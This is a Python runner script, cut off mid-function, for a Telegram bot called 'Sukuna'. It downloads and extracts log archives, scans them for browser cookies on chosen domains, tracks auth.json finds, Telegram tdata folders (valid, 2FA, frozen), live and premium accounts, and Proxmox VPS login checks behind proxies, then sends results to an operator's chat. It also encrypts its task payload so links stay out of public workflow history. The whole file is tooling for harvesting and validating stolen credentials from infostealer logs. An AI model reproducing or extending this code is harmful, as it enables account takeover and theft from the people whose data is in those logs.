
import base64, glob, hashlib, json, multiprocessing, os, platform, queue, re, shutil, signal, socket, subprocess, sys, threading, time, zipfile
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import urlsplit, urlunsplit
import requests

VM_LIFE  = int(3360)                     # lifetime cap advertised on the card
# The task payload may arrive encrypted (the bot encrypts it with the
# RUNNER_TASK_KEY, the workflow decrypts it with the repo secret of the same
# name). An encrypted task keeps the download links and the chat id out of a
# public repository's workflow inputs.
_TASK_   = {}
_RAW     = os.environ.get("TASK") or ""
_KEY     = os.environ.get("TASK_KEY") or ""


def _unseal(raw, key):
    """XOR-CTR with a SHA-256 keystream; the same scheme the bot uses."""
    if not raw.startswith("ENC1:") or not key:
        return raw
    import base64
    try:
        data = base64.b64decode(raw[5:])
    except Exception:
        return raw
    ks = bytearray()
    ctr = 0
    k = key.encode()
    while len(ks) < len(data):
        ks += hashlib.sha256(k + ctr.to_bytes(8, "big")).digest()
        ctr += 1
    plain = bytes(a ^ b for a, b in zip(data, bytes(ks[:len(data)])))
    try:
        return plain.decode("utf-8", "ignore")
    except Exception:
        return raw


try:
    _TASK_ = json.loads(_unseal(_RAW, _KEY) or "{}")
except Exception as e:
    # Never swallow this: without the task the runner has nothing to do and
    # the job would just sit there.
    sys.stdout.write("task unseal failed: %s (raw=%d bytes, key=%d bytes)\n"
                     % (e, len(_RAW), len(_KEY)))
    sys.stdout.flush()
    _TASK_ = {}
# The bot token comes from the task payload when it is there, and from the
# repository secret otherwise. The payload is sealed (ENC1:) with the
# RUNNER_TASK_KEY, so the token does not land in the public run history in
# the clear - and unlike a secret it is refreshed with the payload, so a
# rotated token cannot leave the runner publishing into the void.
TG       = str(_TASK_.get("tg_token") or "") or (os.environ.get("BOT_TOKEN") or "")
TG_API   = "https://api.telegram.org/bot" + TG + "/"
CHAT     = None
PB       = [0.0, None, None, 0, None]  # [last publish, card message id, job t0, publish count, last stage]
WORK  = Path("/tmp/job")
OUT   = Path("/tmp/out")
PROG  = OUT / "progress.json"
CORES = os.cpu_count() or 1
DOMS  = []

_state = {"stage": "boot", "pct": 0, "err": None, "cores": CORES, "job": None}
_flush = [0.0]

RULE   = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
THIN   = "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄"
STAGE_ICON = {
    "boot": "🟡", "idle": "🟢", "installing": "🧩", "download": "📥", "downloaded": "✅",
    "batch_download": "📥",
    "extract": "📦", "extracted": "✅", "wrong_password": "🔑", "scan": "🔍",
    "authcheck": "🔎", "tdatacheck": "🗂",
    "vps_probe": "🌐", "vps_login": "🔐", "vps_pack": "📤",
    "packed": "🗃", "done": "🏁", "error": "❌", "cancelled": "🛑", "cancelling": "🛑",
    "queued": "⏳", "retired": "♻️", "ttl_expired": "♻️",
}
HEADER_MARK = "◆"
BAR_WIDTH = 10
BAR_FULL = "█"
BAR_EMPTY = "░"
USE_BLOCKQUOTES = True
EXPAND_LONG_HELP = True
BOT_NAME = "Sukuna"
VM_TTL = 3600
class _Ref:
    ref = "github-runner"
    born = time.time()
vm = _Ref()

def handle_cancel(sig, frame):
    try:
        if CHAT and PB[1]:
            text = f"{HEADER_MARK} <b>CANCELLED</b>  ·  LOG SEARCH\n{RULE}\n🛑 <b>Job force-cancelled by operator.</b>\n🖥 <b>Job stopped.</b>"
            requests.post(TG_API + "editMessageText", timeout=4, json={
                "chat_id": CHAT, "message_id": PB[1], "text": text, "parse_mode": "HTML"
            })
    except Exception:
        pass
    sys.exit(0)

try:
    signal.signal(signal.SIGINT, handle_cancel)
    signal.signal(signal.SIGTERM, handle_cancel)
except Exception:
    pass

def bq(text: str, expand: bool = False) -> str:
    """Telegram block quote (optionally expandable) — clean, modern banner style."""
    if not USE_BLOCKQUOTES:
        return italic(text)
    tag = "blockquote expandable" if (expand and EXPAND_LONG_HELP) else "blockquote"
    return f"<{tag}>{text}</blockquote>"

def esc(x) -> str:
    return str(x if x is not None else "").replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def bold(x) -> str:
    return f"<b>{esc(x)}</b>"

def code(x) -> str:
    return f"<code>{esc(x)}</code>"

def italic(x) -> str:
    return f"<i>{esc(x)}</i>"

def fmt_size(num) -> str:
    num = float(num or 0)
    for u in ("B", "KB", "MB", "GB", "TB"):
        if num < 1024:
            return f"{num:.1f} {u}"
        num /= 1024
    return f"{num:.1f} PB"

def fmt_time(s) -> str:
    s = int(max(0, s or 0))
    if s < 60:
        return f"{s}s"
    m, s = divmod(s, 60)
    if m < 60:
        return f"{m}m {s}s"
    h, m = divmod(m, 60)
    return f"{h}h {m}m"

def bar(pct, width: int = None) -> str:
    """Monospace progress bar: filled blocks + light blocks."""
    w = width or BAR_WIDTH
    pct = max(0, min(100, int(pct or 0)))
    f = round(pct / 100 * w)
    return BAR_FULL * f + BAR_EMPTY * (w - f)

def gold_header(title: str, sub: str = "") -> str:
    """Card header — bot name + title inside a block quote (no emoji clutter)."""
    inner = f"{HEADER_MARK} {bold(BOT_NAME.upper() + '  ·  ' + title)}\n{RULE}"
    if sub:
        inner += f"\n{sub}"
    return bq(inner)

def vm_card(p: dict, job: dict) -> str:
    """Hardware + lifetime panel for the CPU Space running this job."""
    vm_ = p.get("vm") or {}
    if not vm_:
        return f"🖥 {bold('VM')} booting — specs will appear in a moment…"
    age = (time.time() - vm.born) / 60 if vm.born else 0.0
    rows = [
        f"🖥 {bold('VM')}     {code(vm.ref or '?')}",
        f"🧠 {bold('CPU')}    {code(vm_.get('cores', '?'))} vCPU · {esc(str(vm_.get('cpu', 'unknown'))[:46])}",
        f"🐏 {bold('RAM')}    {code(vm_.get('ram', '?'))}"
        + (f" · free {code(vm_.get('ram_free', '?'))}" if vm_.get("ram_free") else ""),
        f"💽 {bold('DISK')}   {code(vm_.get('disk', '?'))}"
        + (f" · free {code(vm_.get('disk_free', '?'))}" if vm_.get("disk_free") else ""),
        f"🐧 {bold('OS')}     {code(vm_.get('os', '?'))} · host {code(vm_.get('host', '?'))}",
        f"🎮 {bold('GPU')}    {code(vm_.get('gpu', 'none'))} · py {code(vm_.get('py', '?'))}",
        f"♻️ {bold('LIFE')}   {code(f'{age:.1f}m / {VM_TTL // 60}m to recycle')}"
        f" · load {code(vm_.get('avg_load', '-'))}",
    ]
    return "\n".join(rows)

def stage_panel(p: dict) -> str:
    stage = p.get("stage", "queued")
    pct = p.get("pct", 0)
    lines = [f"{STAGE_ICON.get(stage, '⚙️')} {bold(stage.upper())}   {code(str(pct) + '%')}",
             bar(pct)]

    if stage in ("download", "downloaded") and p.get("got") is not None:
        got, tot = p.get("got"), p.get("total", "?")
        elapsed = p.get("elapsed") or p.get("dl_time") or "-"
        lines.append(f"📁 {code(got)} / {code(tot)}   ⚡ {code(p.get('speed', '-'))}   ⏱ {code(elapsed)}")
        if p.get("file"):
            lines.append(f"🏷 {code(p['file'])} ({code(fmt_size(p.get('size')))})")

    if stage in ("extract", "extracted", "wrong_password") and p.get("files_total"):
        files = f"{p.get('files', 0)}/{p.get('files_total')}"
        lines.append(f"📄 {code(files)}   💾 {code(p.get('extracted', '-'))}")
        lines.append(f"⚡ {code(p.get('ex_speed', '-'))}   👷 {code(p.get('file_speed', '-'))}   "
                     f"⏳ ETA {code(p.get('eta', '-'))}   ⏱ {code(p.get('elapsed', '-'))}")
        if p.get("engine"):
            load = f"{p['core_load']:.1f}" if p.get("core_load") else "-"
            lines.append(f"🧵 {code(p['engine'])} · threads {code(p.get('threads', '?'))} · load {code(load)}")
        if p.get("last_file"):
            lines.append(f"📝 {code(p['last_file'])}")
        if stage == "wrong_password":
            lines.append(f"🔑 {code(p.get('tried', '?'))} {bold('rejected')}")

    if stage in ("vps_probe", "vps_login", "vps_pack") and p.get("total") is not None:
        if stage == "vps_probe":
            lines.append(f"🔎 {bold('Panels')}  {code(p.get('total', 0))}")
            lines.append(f"🌐 {bold('Reachable')} {code(p.get('ok', 0))}   "
                         f"⛔ {bold('Not-PVE')} {code(p.get('invalid', 0))}   "
                         f"💀 {bold('Dead')} {code(p.get('dead', 0))}")
        else:
            lines.append(f"🔑 {bold('Entries')} {code(p.get('total', 0))}")
            lines.append(f"✅ {bold('Valid')} {code(p.get('valid', 0))}   "
                         f"❌ {bold('Bad')} {code(p.get('bad', 0))}   "
                         f"⚠️ {bold('Errors')} {code(p.get('errors', 0))}")
        lines.append(f"⚡ {code(p.get('speed', '-'))}   ⏳ ETA {code(p.get('eta', '-'))}   "
                     f"⏱ {code(p.get('elapsed', '-'))}")

    if stage in ("scan", "packed") and p.get("log_files") is not None:
        pd = p.get("per_domain") or {}
        det = "  ".join(f"{code(k)}={code(v)}" for k, v in pd.items()) or code("-")
        scanned = f"{p.get('scanned', 0)}/{p.get('log_files')}"
        lines.append(f"📂 {code(scanned)} logs   🍪 {code(p.get('sessions', 0))} sessions")
        lines.append(f"🧠 {code(p.get('cores', '?'))} cores · {code(p.get('workers', '?'))} workers")
        lines.append(f"🗂 {det}")
        if p.get("auth") is not None:
            lines.append(f"🔑 {code(p.get('auth'))} auth.json found")

    if stage == "authcheck" and p.get("auth_total"):
        tot_a = p.get("auth_total") or 1
        done_a = p.get("checked", 0)
        lines.append(f"🔑 {code('%d / %d' % (done_a, p.get('auth_total', 0)))}"
                     f"  {bar(done_a * 100 // tot_a)}")
        lines.append(f"✅ {code(p.get('live', 0))} live "
                     f"(💰 {code(p.get('prem', 0))} premium · 🆓 {code(p.get('free', 0))})")
        lines.append(f"⏳ {code(p.get('expired', 0))} expired   "
                     f"❌ {code(p.get('dead', 0))} dead   "
                     f"⚠️ {code(p.get('err', 0))} error   🌍 {code(p.get('proxies', 0))} proxies")

    if stage == "tdatacheck" and p.get("tk_total"):
        lines.append(f"🗃 {code('%d folders' % p.get('tk_total', 0))}"
                     f"  {bar((p.get('tk_done') or 0) * 100 // max(p.get('tk_total'), 1))}")
        lines.append(f"✅ {code(p.get('tk_valid', 0))} valid "
                     f"(★ {code(p.get('tk_prem', 0))} premium · 🔒 {code(p.get('tk_2fa', 0))} 2FA)")
        lines.append(f"🧊 {code(p.get('tk_frozen', 0))} frozen   "
                     f"💀 {code(p.get('tk_dead', 0))} dead   ⏳ {code(p.get('tk_err', 0))} retrying"
                     f"   🌍 {code(p.get('tk_proxies', 0))} proxies")

    if stage == "batch_download":
        lines.append(f"📂 {bold('Files')}   {code('%d/%d' % (p.get('files_done', 0), p.get('files_total', 0)))} loaded"
                     f"   💾 {code(p.get('total', '?'))}")
        lines.append(f"📥 {code(p.get('got', '0 B'))} / {code(p.get('total', '?'))}"
                     f"   ⚡ {code(p.get('speed', '-'))}   ⏱ {code(p.get('elapsed', '-'))}")
        if p.get("file"):
            lines.append(f"🏷 {code(p['file'])}")
        if p.get("note"):
            lines.append(f"⏳ {code(p['note'])}")
    elif p.get("batch_total"):
        lines.append(f"📂 {bold('Batch')}   {code(p.get('batch_files', '-'))} files loaded"
                     f"   💾 {code(p.get('batch_total'))}")

    if stage == "error" and p.get("err"):
        lines.append(f"⚠️ {bold('Error')}: {code(p.get('err'))}")
    return "\n".join(lines)
def live_text(job) -> str:
    p = job.get("prog") or {}
    kind = p.get("kind") or ""
    vps_kind = kind.startswith("vps")
    wall = fmt_time(time.time() - job["t0"])
    jid = job["id"]
    if kind == "batch":
        head = gold_header('BATCH ENGINE', 'Batch · %s' % (p.get("mode") or "-"))
    elif vps_kind:
        head = gold_header('VPS SCAN', 'Live Console')
    else:
        head = gold_header('LOG SEARCH', 'Live Console')
    return (f"{head}\n"
            f"{THIN}\n"
            f"{stage_panel(p)}\n"
            f"{THIN}\n"
            f"{vm_card(p, job)}\n"
            f"{THIN}\n"
            f"⏳ {bold('Wall time')} {code(wall)}   🆔 {code(jid)}\n"
            f"🛑 Cancel: {code('/cancel ' + jid)}")

def job_ctx():
    return {"prog": _state, "t0": PB[2] or time.time(), "id": _state.get("job") or "-"}

def pub(force=False):
    """Edit the user's live gold card straight from the Space (no bot-side polling)."""
    if not CHAT or not PB[1]:
        return
    n = time.time()
    cur_stage = _state.get("stage")
    stage_changed = (len(PB) > 4 and cur_stage != PB[4])
    hot = force or stage_changed or cur_stage in ("done", "error", "cancelled",
                                                  "wrong_password", "idle", "retired")
    if n - PB[0] < (0.5 if hot else 2.5):
        return
    PB[0] = n
    if len(PB) > 4:
        PB[4] = cur_stage
    try:
        r = tg_post(TG_API + "editMessageText", tries=3, timeout=30, json={
            "chat_id": CHAT, "message_id": PB[1], "text": live_text(job_ctx()),
            "parse_mode": "HTML"})
        if r is not None and getattr(r, "status_code", 0) == 200:
            PB[3] += 1
        elif r is not None and "message is not modified" not in (getattr(r, "text", "") or ""):
            sys.stdout.write("tg edit %s: %s\n" % (r.status_code, r.text[:150])); sys.stdout.flush()
    except Exception as e:
        sys.stdout.write("tg edit failed: %s\n" % e); sys.stdout.flush()

def new_card(text):
    """Post a fresh gold message and return its id (used when there is no card to edit)."""
    if not CHAT:
        return None
    try:
        r = tg_post(TG_API + "sendMessage", timeout=30, json={
            "chat_id": CHAT, "text": text, "parse_mode": "HTML"})
        if r is None:
            return None
        try:
            return (r.json().get("result") or {}).get("message_id")
        except Exception:
            return None
    except Exception as e:
        sys.stdout.write("tg send failed: %s\n" % e); sys.stdout.flush()
        return None

def report(payload, tries=1):
    """Emit the terminal result on stdout; the bot reads it from the run's log."""
    sys.stdout.write("RESULT " + json.dumps(payload, separators=(",", ":")) + "\n")
    sys.stdout.flush()
    return True

def upload(name, caption):
    """Send a result file straight from the VM to the user's chat."""
    if not TG or not CHAT: return False
    last = None
    for attempt in range(6):
        try:
            with open(name, "rb") as fh:
                # requests cannot mix json= and files=: the fields must travel as multipart data.
                r = tg_post(TG_API + "sendDocument", tries=1,
                            data={"chat_id": CHAT, "caption": caption,
                                  "parse_mode": "HTML"},
                            files={"document": (name.split("/")[-1], fh)}, timeout=300)
            if r is not None and r.status_code == 200:
                return True
            last = r
            sys.stdout.write("tg send %s: %s (attempt %d/6)\n"
                             % (name, getattr(r, "text", r)[:200], attempt + 1))
            sys.stdout.flush()
        except Exception as e:
            last = e
            sys.stdout.write("tg send error: %s (attempt %d/6)\n" % (e, attempt + 1))
            sys.stdout.flush()
        time.sleep(min(5 * (attempt + 1), 30))
    return False

def tg_post(url, tries=5, **kw):
    """POST to the Bot API and retry the failures that are not our fault.

    The API answers 502 or simply times out when Telegram's edge for the
    runner's address wobbles. A result file must never be lost because of
    that, so every call is retried with a growing delay."""
    delay = 4
    last = None
    for attempt in range(tries):
        try:
            r = requests.post(url, **kw)
            if r.status_code == 200:
                return r
            last = r
            if r.status_code in (429, 500, 502, 503, 504):
                sys.stdout.write("tg api %s: %s (retry %d/%d)\n"
                                 % (url.rsplit("/", 1)[-1], r.text[:140], attempt + 1, tries))
                sys.stdout.flush()
                wait = delay
                try:
                    ra = int(((r.json() or {}).get("parameters") or {}).get("retry_after") or 0)
                    if ra:
                        wait = min(max(ra, delay), 60)
                except Exception:
                    pass
                time.sleep(wait)
                delay = min(delay * 2, 30)
                continue
            return r
        except Exception as e:
            last = e
            sys.stdout.write("tg api error: %s (retry %d/%d)\n" % (e, attempt + 1, tries))
            sys.stdout.flush()
            time.sleep(delay)
            delay = min(delay * 2, 30)
    return last


def ft(s):
    s = int(max(0, s or 0))
    if s < 60: return "%ds" % s
    m, s = divmod(s, 60)
    if m < 60: return "%dm %ds" % (m, s)
    h, m = divmod(m, 60); return "%dh %dm" % (h, m)

def fs(b):
    b = float(b or 0)
    for u in ("B", "KB", "MB", "GB", "TB"):
        if b < 1024: return "%.1f %s" % (b, u)
        b /= 1024
    return "%.1f PB" % b

def st(stage, pct=None, err=None, **kw):
    _state["stage"] = stage
    if pct is not None: _state["pct"] = max(0, min(100, int(pct)))
    if err is not None: _state["err"] = err
    _state.update(kw)
    flush(True)

def tick(stage, pct=None, **kw):
    """High-frequency progress: throttled to 1.5s to avoid hammering the disk."""
    _state["stage"] = stage
    if pct is not None: _state["pct"] = max(0, min(100, int(pct)))
    _state.update(kw)
    flush(False)

def flush(force=False):
    n = time.time()
    if not force and n - _flush[0] < 1.5: return
    _flush[0] = n
    _state["hb"] = n
    try:
        OUT.mkdir(parents=True, exist_ok=True)
        blob = json.dumps(_state)
        PROG.write_text(blob)
        sys.stdout.write("PROGRESS " + blob + "\n"); sys.stdout.flush()
    except Exception: pass
    if not _state.get("booting"):
        pub(force)

def stop():
    return (OUT / "cancel.flag").exists()

def run(c, **kw):
    return subprocess.run(c, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                          text=True, errors="ignore", **kw)

def vm_specs():
    """Hardware profile of the Space container this job runs on."""
    s = {"cpu": "unknown", "cores": CORES, "threads": CORES, "ram": "?", "ram_mb": 0,
         "disk": "?", "disk_gb": 0, "os": "?", "host": socket.gethostname(),
         "gpu": "none (CPU VM)", "avg_load": "-"}
    try:
        for ln in open("/proc/cpuinfo"):
            if ln.lower().startswith("model name"):
                s["cpu"] = ln.split(":", 1)[1].strip(); break
    except Exception: pass
    try:
        s["threads"] = len(os.sched_getaffinity(0))
    except Exception: pass
    try:
        p = Path("/proc/meminfo").read_text()
        mb = int(re.search(r"MemTotal:\s+(\d+)", p).group(1)) // 1024
        s["ram_mb"] = mb; s["ram"] = fs(mb * 1024 * 1024)
        free_mb = int(re.search(r"MemAvailable:\s+(\d+)", p).group(1)) // 1024
        s["ram_free"] = fs(free_mb * 1024 * 1024)
    except Exception: pass
    try:
        u = os.statvfs("/")
        gb = u.f_blocks * u.f_frsize / 1024 ** 3
        s["disk_gb"] = round(gb, 1); s["disk"] = "%.1f GB" % gb
        s["disk_free"] = "%.1f GB" % (u.f_bavail * u.f_frsize / 1024 ** 3)
    except Exception: pass
    try:
        s["avg_load"] = "%.2f / %.2f / %.2f" % os.getloadavg()
    except Exception: pass
    try:
        s["os"] = " ".join(platform.freedesktop_os_release().get("PRETTY_NAME", "?").split())
    except Exception:
        try: s["os"] = "Linux %s" % platform.release()
        except Exception: pass
    try:
        r = run(["nvidia-smi", "--query-gpu=name", "--format=csv,noheader"])
        if r.returncode == 0 and r.stdout.strip():
            s["gpu"] = r.stdout.strip().splitlines()[0]
    except Exception: pass
    try:
        s["py"] = sys.version.split()[0]
    except Exception: pass
    return s

def apt(pkgs):
    if not shutil.which("apt-get"): return False
    try:
        run(["apt-get", "update", "-qq"], timeout=900)
        return run(["apt-get", "install", "-y", "-qq"] + list(pkgs), timeout=1200).returncode == 0
    except Exception: return False

# ── Netscape cookie parser (HttpOnly preserved) ──
def parse_cookie(line):
    line = line.rstrip("\r\n")
    if not line.strip(): return None
    if line.startswith("#") and not line.startswith(("#HttpOnly_", "#HttpOnly.")): return None
    pre, chk = "", line.strip()
    if chk.startswith("#HttpOnly_"): pre, chk = "#HttpOnly_", chk[10:]
    elif chk.startswith("#HttpOnly."): pre, chk = "#HttpOnly.", chk[10:]
    p = chk.split("\t")
    if len(p) >= 7:
        dom, flag, path, sec, exp, name = p[:6]; val = "\t".join(p[6:])
    else:
        p = re.split(r"\s+", chk, maxsplit=6)
        if len(p) != 7: return None
        dom, flag, path, sec, exp, name, val = p
    dom, name = dom.strip(), name.strip()
    if not dom or not name or not val.strip(): return None
    fl = "TRUE" if flag.strip().upper() in ("TRUE", "1") else "FALSE"
    sc = "TRUE" if sec.strip().upper() in ("TRUE", "1") else "FALSE"
    fmt = "\t".join([pre + dom, fl, path.strip() or "/", sc, exp.strip() or "0", name, val])
    return (dom.lower(), name, val, fmt)

def scan_file(path):
    """One log file -> one cookie session {domain: [(name, val, line), ...]}"""
    per_dom = {}
    try:
        with open(path, "rb") as fh:
            data = fh.read()
    except Exception:
        return per_dom
    if not data:
        return per_dom
    low = data.lower()
    if DOMS and not any(d.encode() in low for d in DOMS):
        return per_dom            # cheap reject: the domain never appears in the file
    try:
        text = data.decode("utf-8", "ignore")
    except Exception:
        return per_dom
    for raw in text.splitlines():
        if "\t" not in raw and raw.count(" ") < 6:
            continue
        c = parse_cookie(raw)
        if not c: continue
        dom, name, val, fmt = c
        for d in DOMS:
            if d in dom:
                per_dom.setdefault(d, []).append((name, val, fmt))
    return per_dom

def scan_chunk(paths):
    return [scan_file(p) for p in paths]

# ── 1. download ──
PD_HOSTS   = ("pixeldrain.com", "pixeldrain.net", "pixeldra.in", "pixeldrain.nl",
              "pixeldrain.biz", "pixeldrain.tech", "pixeldrain.dev")
PD_PROXIES = ("pd.cybar.xyz", "pd.1drv.eu.org")      # mirrors, they take bare /<id>
PD_ID      = re.compile(r"[A-Za-z0-9_-]{4,20}\Z")
PD_ARC     = re.compile(r"\.(zip|rar|7z|tar|gz|tgz)\Z", re.I)
PD_HDRS    = {"User-Agent": "Mozilla/5.0"}

def pd_host(url):
    m = re.search(r"https?://([^/\s?#]+)", url)
    return m.group(1).lower() if m else ""

def pd_parts(url, host):
    """('file' | 'list', id, item, err) — err only when the link is Pixeldrain but
    names nothing we can pull (so aria2c never streams an HTML page)."""
    segs = [s for s in url.split("://", 1)[1][len(host):].split("#")[0]
            .split("?")[0].split("/") if s]
    im = re.search(r"item=(\d+)", url.split("#", 1)[1] if "#" in url else "")
    item = int(im.group(1)) if im else None
    if len(segs) > 2 and segs[0] == "api" and segs[1] in ("file", "list"):
        return ("list" if segs[1] == "list" else "file"), segs[2], item, None
    if len(segs) > 1 and segs[0] in ("u", "f", "l") and PD_ID.match(segs[1]):
        return ("list" if segs[0] == "l" else "file"), segs[1], item, None
    if len(segs) == 1 and host in PD_PROXIES and PD_ID.match(segs[0]):
        return "file", segs[0], item, None
    if segs[:1] == ["d"]:
        return None, None, None, "pixeldrain folder (/d/) link — send one /u/ archive link"
    return None, None, None, "no file id in that pixeldrain link (…/u/XXXXXXXX)"

def resolve(url):
    """(direct URL, filename, size, err). Pixeldrain share pages are HTML, so
    /u/ and /l/ links become the real API download URL; every other link is
    handed to aria2c untouched. /info matters — plain /api/file/<id> IS the file."""
    host = pd_host(url)
    if host not in PD_HOSTS + PD_PROXIES:
        fname, fsize = None, 0
        resolved_url = url
        try:
            hr = requests.head(url, allow_redirects=True, timeout=10,
                               headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
            if hr.status_code < 400:
                resolved_url = hr.url or url
                cd = hr.headers.get("Content-Disposition") or ""
                m = re.search(r'filename\*?=(?:UTF-8\'\')?"?([^";]+)"?', cd)
                if m:
                    fname = os.path.basename(m.group(1).strip().replace('"', ''))
                cl = hr.headers.get("Content-Length")
                if cl and cl.isdigit():
                    fsize = int(cl)
        except Exception:
            pass
        return resolved_url, fname, fsize, None
    kind, pid, item, err = pd_parts(url, host)
    if err:
        return None, None, 0, err
    api = "https://%s/api/" % ("pixeldrain.com" if host in PD_PROXIES else host)
    try:
        body = requests.get((api + "list/" + pid) if kind == "list"
                            else (api + "file/" + pid + "/info"),
                            timeout=30, headers=PD_HDRS).json()
    except Exception as e:
        return None, None, 0, "pixeldrain lookup failed: %s" % str(e)[:90]
    if not body.get("success", True):
        return None, None, 0, "pixeldrain: %s" % (body.get("message") or
                                                  body.get("value") or "link not found")
    files = [f for f in (body.get("files") if kind == "list" else [body])
             if isinstance(f, dict) and f.get("name")]
    if not files:
        return None, None, 0, "pixeldrain: nothing behind that link (deleted, private or empty)"
    if item is not None and item < len(files):
        files = [files[item]]
    if len(files) > 1:
        files = [f for f in files if PD_ARC.search(f["name"])]
        if not files:
            return None, None, 0, "pixeldrain folder holds no .zip/.rar/.7z archive"
    pick = max(files, key=lambda f: f.get("size") or 0)
    avail = (pick.get("availability") or "").strip()
    if avail:
        return None, None, 0, "pixeldrain: %s" % (pick.get("availability_message") or avail)
    return (api + "file/%s?download" % (pick.get("id") or pid),
            re.sub(r'[\\/:*?"<>|]+', "_", pick["name"])[:100],
            int(pick.get("size") or 0), None)

def download(url):
    dest = WORK / "dl"; dest.mkdir(parents=True, exist_ok=True)
    _state["err"] = None
    marker = dest / ".url"
    if marker.exists() and marker.read_text() == url:
        for e in ("*.zip", "*.rar", "*.7z", "*.ZIP", "*.RAR", "*.tar", "*.gz"):
            for cand in glob.glob(str(dest / e)):
                if os.path.isfile(cand) and os.path.getsize(cand) > 0:
                    st("downloaded", 30, file=Path(cand).name, cached=True,
                       size=fs(os.path.getsize(cand)),
                       msg="same link — reusing the archive already on this VM")
                    return Path(cand)
    src, fname, fsize, err = resolve(url)
    if err:
        _state["err"] = err
        st("error", err=err); return None
    if src != url:
        st("download", 4, msg="pixeldrain link resolved → %s (%s)"
           % (fname or "?", fs(fsize) if fsize else "?"))
        url = src
    if not shutil.which("aria2c"):
        st("installing", 3); apt(["aria2", "p7zip-full", "unrar-free"])
    use_aria = shutil.which("aria2c") is not None
    is_internal = ("/dl/" in url) or ("trycloudflare.com" in url) or ("107.149.158.183" in url) or ("5.9.215.99" in url)
    # Relay links travel through the tunnel, and the edge throttles every
    # connection on its own: four connections cap the whole transfer at a
    # few MB/s. Many connections are what buys the bandwidth here.
    #
    # The number of connections is the single biggest lever on a relay
    # download: each connection is an independent range request and the edge
    # meters them one by one. RELAY_SPLITS overrides it when a host is
    # tight on sockets or the relay runs out of session slots.
    try:
        split_count = int(os.environ.get("RELAY_SPLITS") or "")
    except Exception:
        split_count = 0
    if split_count <= 0:
        # The edge throttles every connection on its own, so the aggregate is
        # roughly connections x per-connection rate. 32 was chosen while the
        # relay still advertised a 64 KB TCP window and per-connection rate
        # was tiny; after the host TCP buffers were raised the relay can feed
        # more streams. 64 stays well below the edge's ~344-connection cap
        # even with four files downloading at once.
        split_count = 96 if is_internal else 16
    engine_name = "aria2c (%d-stream falloc)" % split_count if use_aria else "fast-parallel"
    st("download", 4, engine=engine_name, file=fname, size=fsize)
    t0 = time.time()
    found = None
    if use_aria:
        cmd = [ "aria2c", "--dir", str(dest), f"--split={split_count}", f"--max-connection-per-server={split_count}",
                "--file-allocation=falloc",
                "--disk-cache=64M", "--socket-recv-buffer-size=4M",
                "--min-split-size=256K",
                "--stream-piece-selector=default", "--piece-length=1M",
                "--optimize-concurrent-downloads=true", "--auto-file-renaming=false",
                "--allow-overwrite=true", "--console-log-level=warn", "--summary-interval=1",
                "--max-tries=10", "--retry-wait=2",
                "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "--header=Accept: */*" ]
        if shutil.which("stdbuf"):
            cmd = ["stdbuf", "-oL", "-eL"] + cmd
        if fname:
            cmd += ["--out", fname]
        cmd.append(url)
        pr = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                              text=True, errors="ignore", bufsize=1)
        pe = re.compile(r"\[#\w+\s+([\d.]+\w+)/([\d.]+\w+)\((\d+)%\)")
        se = re.compile(r"DL:([\d.]+\w+)")
        tail = []
        last_dl_tick = 0.0
        for raw in pr.stdout:
            if stop():
                pr.terminate(); return None
            tail.append(raw.strip())
            tail = tail[-25:]
            m = pe.search(raw)
            if m:
                s = se.search(raw)
                pct_dl = 4 + int(m.group(3)) * 0.26
                now_t = time.time()
                if (pct_dl - _state.get("pct", 0) >= 3) or (now_t - last_dl_tick >= 2.5):
                    last_dl_tick = now_t
                    st("download", pct_dl, got=m.group(1),
                       total=m.group(2) if fsize == 0 else fs(fsize),
                       speed=(s.group(1) + "/s") if s else "-", elapsed=ft(now_t - t0),
                       file=fname, size=fsize)
            fm = re.search(r"Download complete:\s*(.+)", raw)
            if fm: found = fm.group(1).strip()
        pr.wait()
        if fname and (dest / fname).is_file():
            found = str(dest / fname)
        if pr.returncode not in (0, None):
            sys.stdout.write("ARIA2 FAIL rc=%s, activating fast parallel engine\n" % pr.returncode)
            sys.stdout.flush()
            found = fast_parallel_dl(url, dest, fname, fsize, t0)
            if not found:
                # The fallback could not complete the file either. The file
                # aria2c left behind has the right length but holes in it, so
                # it must not reach the scanner.
                for stale in (dest / fname,) if fname else ():
                    try:
                        stale.unlink(missing_ok=True)
                    except Exception:
                        pass
                return None
    else:
        found = fast_parallel_dl(url, dest, fname, fsize, t0)
    if not found or not os.path.isfile(found):
        cand = []
        for e in ("*.zip", "*.rar", "*.7z", "*.ZIP", "*.RAR"):
            cand += glob.glob(str(dest / e))
        cand = cand or [str(p) for p in dest.iterdir()
                        if p.is_file() and p.name != ".url"]
        if not cand:
            st("error", err="archive_not_found"); return None
        found = cand[0]
    try:
        marker.write_text(url)
    except Exception:
        pass
    st("downloaded", 30, file=Path(found).name, size=fs(os.path.getsize(found)),
       dl_time=ft(time.time() - t0))
    return Path(found)

def fast_parallel_dl(url, dest, fname=None, fsize=0, t0=None, progress_cb=None):
    """High-throughput multi-connection parallel segment downloader using atomic
    posix_fallocate + direct os.pwrite without seeking or locking races.

    progress_cb, when given, receives the number of bytes that were just
    written. The batch downloader uses it to publish one aggregate progress
    line for the whole set instead of one line per file."""
    import urllib.request, concurrent.futures
    t0 = t0 or time.time()
    dest = Path(dest)
    dest.mkdir(parents=True, exist_ok=True)

    total_size = fsize or 0
    range_supported = False
    final_url = url
    try:
        probe_req = urllib.request.Request(url, headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Range': 'bytes=0-0'
        })
        with urllib.request.urlopen(probe_req, timeout=15) as resp:
            final_url = resp.geturl() or url
            cr = resp.headers.get('Content-Range')
            if cr and '/' in cr:
                try: total_size = int(cr.split('/')[-1])
                except Exception: pass
                range_supported = True
            elif resp.headers.get('Accept-Ranges') == 'bytes':
                range_supported = True
            if not total_size:
                try: total_size = int(resp.headers.get('Content-Length') or 0)
                except Exception: pass
    except Exception:
        pass

    out_name = fname
    if not out_name:
